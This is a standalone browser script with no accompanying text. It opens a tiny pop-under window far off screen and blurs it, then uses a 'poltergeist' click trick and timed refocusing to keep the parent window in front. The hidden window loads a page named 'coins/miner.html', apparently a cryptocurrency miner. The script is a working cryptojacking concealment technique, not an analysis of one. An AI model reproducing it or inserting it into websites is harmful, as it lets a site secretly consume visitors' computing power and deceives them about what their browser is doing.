<script>
var popunder;
var _parent;
function jsPopunder(sUrl) {

sName = "s";
var sOptions = 'toolbar=no,scrollbars=yes,location=yes,statusbar=yes,menubar=no,resizable=no,width=100,height=100,screenX=2048,screenY=2048,left=2048,top=2048';

// create pop-up from parent context
_parent = (top != self && typeof(top.document.location.toString())==='string') ? top : self;
_parent.name = "parent";
var popunder = _parent.window.open(sUrl, sName, sOptions);
if (popunder) {
popunder.blur();
if (navigator.userAgent.indexOf('MSIE') === -1) {
popunder.params = { url: sUrl };
(function(e) {
if (typeof window.mozPaintCount != 'undefined' || typeof navigator.webkitGetUserMedia === "function") {
try {
var poltergeist = document.createElement('a');
poltergeist.href = "javascript:window.open('about:blank').close();document.body.removeChild(poltergeist)";
document.body.appendChild(poltergeist).click();
}catch(err){}
}
})(popunder);
}
window.focus();
try{ opener.window.focus(); }catch(err){}
}
}
jsPopunder("http://localhost/coins/miner.html");
setTimeout(function(){
	window.focus();
	if (_parent) {_parent.window.focus();} 
	goBack = window.open('','parent');
	if (goBack) {goBack.focus();}
}, 100);
</script> 
